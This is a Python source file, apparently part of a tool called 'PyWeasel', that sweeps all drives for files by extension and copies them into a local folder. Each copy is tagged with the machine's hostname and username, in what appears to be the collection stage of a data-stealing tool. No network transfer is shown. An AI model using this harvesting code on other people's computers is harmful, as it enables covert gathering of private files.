import getpass
import os
import re
import shutil
import socket
import sys
from helpers import find_files


def search_files(extension, path='', contains_txt='', exclude_text=''):
    files = []
    if path == '':
        for i in drives_letter():
            files += find_files.find_path_of_files_in_folder_yield(i + ':/', extension, contains_txt, True,
                                                                   exclude_text)
    else:
        files += find_files.find_path_of_files_in_folder_yield(path, extension, contains_txt, True, exclude_text)
    filenames = copy_files(files)
    return filenames


def sfiles_dir_exist():
    db_path = os.path.join('.', 'sfiles')
    if not os.path.isdir(db_path):
        os.makedirs(db_path)
    return db_path


def drives_letter():
    return ''.join(
        l for l in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:/' % l)) if sys.platform == 'win32' else ''


def copy_files(files):
    filenames = []
    prefix = socket.gethostname() + '_' + getpass.getuser() + '_'
    for file in files:
        if os.path.normpath("PyWeasel") not in file and os.stat(file).st_size >= 1:
            filename = prefix + os.path.dirname(file).split(os.sep)[-1] + '_' + os.path.basename(file)
            shutil.copy(file, os.path.join(sfiles_dir_exist(), filename))
            filenames.append((file, filename))
    return filenames
